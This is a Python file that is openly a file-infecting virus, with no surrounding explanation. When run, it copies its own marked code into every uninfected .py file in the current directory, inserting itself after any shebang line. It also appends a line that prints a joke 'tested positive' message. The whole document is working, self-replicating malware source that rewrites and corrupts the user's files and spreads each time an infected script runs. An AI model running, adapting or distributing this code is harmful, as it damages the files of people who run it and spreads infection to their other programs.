#!/usr/bin/env python
### VIRUS BEGIN ###
import sys
import glob
import re
import os

# Count the number of lines in the virus file.
virus_code = []
virus_file = open(sys.argv[0], 'r')
virus_length = len(virus_file.readlines())
virus_file.close()
 
# Make a copy of the virus, i.e., everything between the '### VIRUS BEGIN ###' and '### VIRUS END ###' comments.
virus_file = open(sys.argv[0], 'r')
start_reading = False

for i in range(0, virus_length, 1):
    current_line = virus_file.readline()

    if re.search('^### VIRUS BEGIN ###', current_line):
        start_reading = True

    if start_reading:
        virus_code.append(current_line)

    if re.search('^### VIRUS END ###', current_line):
        break

virus_file.close()

# A simple payload message to be inserted at the end of an infected Python file.
payload_message = 'Sorry, but your file just tested positive for the rona :('

# Find potential victims, i.e., uninfected Python files in the same directory.
potential_victims = []
for name in glob.glob('*.py'):
    potential_victims.append(name)

# Check for uninfected files.
uninfected_victims = []
for potential_victim in potential_victims:
    victim_file = open(potential_victim, 'r')
    victim_code = victim_file.readlines()
    infected = False # Assume that all potential victims are not infected at first.

    # A file is already infected if it contains the string '### VIRUS BEGIN ###'.
    for line in victim_code:
        infected = re.search('^### VIRUS BEGIN ###', line)
        if infected:
            break

    if not infected:
        uninfected_victims.append(potential_victim)

    victim_file.close()

# Infect the victims.
for victim in uninfected_victims:
    victim_file = open(victim, 'r')
    victim_code = victim_file.readlines()
    victim_file.close()
    has_shebang = False # Assume that all uninfected files don't have a shebang at first.

    # Check if the current file is empty.
    empty = os.stat(victim).st_size == 0

    if empty:
        # Insert a shebang at the 1st line.
        victim_file = open(victim, 'a')
        victim_file.write('#!/usr/bin/env python\n')
        victim_file.close

        # Add the virus code to the empty file.
        for i in range(0, len(virus_code), 1):
            victim_file = open(victim, 'a')
            victim_file.write(virus_code[i])
            victim_file.close()

        # Add a payload message to the end of the file.
        victim_file = open(victim, 'a')
        victim_file.write('print(payload_message)\n')
        victim_file.close()
    else:
        has_shebang = re.search('^#!/usr/bin/env python', victim_code[0])
        
        # Temporarily clear the file.
        victim_file = open(victim, 'w').close()

        # The specific placement of the virus code will depend on whether a shebang is present or not.
        if has_shebang:
            # Insert the virus code between the shebang and the original code.
            for i in range(0, len(virus_code), 1):
                victim_code.insert(i + 1, virus_code[i])
        else:
            # Insert the virus code in the beninging.
            for i in range(0, len(virus_code), 1):
                victim_code.insert(i, virus_code[i])

        # Rewrite the code with the inserted virus code to the file.
        for i in range(0, len(victim_code), 1):
            victim_file = open(victim, 'a')
            victim_file.write(victim_code[i])
            victim_file.close()

        # Add a payload message to the end of the file.
        victim_file = open(victim, 'a')
        victim_file.write('print(payload_message)\n')
        victim_file.close()
### VIRUS END ###
